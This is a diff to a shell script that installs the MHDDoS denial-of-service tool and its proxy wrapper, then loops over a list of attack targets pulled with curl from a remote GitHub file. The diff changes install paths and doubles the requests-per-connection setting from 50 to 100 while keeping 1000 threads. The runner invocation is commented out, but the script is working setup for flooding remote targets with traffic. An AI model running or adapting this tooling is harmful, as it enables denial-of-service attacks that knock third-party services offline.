@@ -3,13 +3,13 @@
 sudo apt update -y
 sudo apt install git python3 python3-pip -y
 sudo pip install --upgrade pip
-#cd ~
-sudo rm -r ~/mhddos_proxy
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git ~/
-#cd mhddos_proxy
-sudo wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json -P ~/mhddos_proxy/
-sudo git clone https://github.com/MHProDev/MHDDoS.git ~/mhddos_proxy/
-sudo python3 -m pip install -r ~/mhddos_proxy/MHDDoS/requirements.txt
+cd ~
+sudo rm -r mhddos_proxy
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+sudo wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
+sudo git clone https://github.com/MHProDev/MHDDoS.git
+sudo python3 -m pip install -r MHDDoS/requirements.txt
 
 threads="${1:-1000}"; threads="-t $threads"
 
@@ -23,7 +23,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            echo -e $i": " "$cmd_line $threads "--rpc 50" "-p 3600" "--debug"\n"
+            echo -e $i": " "$cmd_line $threads "--rpc 100" "-p 3600" "--debug"\n"
             #python3 ~/mhddos_proxy/runner.py $cmd_line $threads $proxy_interval $rpc $debug&
       done
 sleep 20m
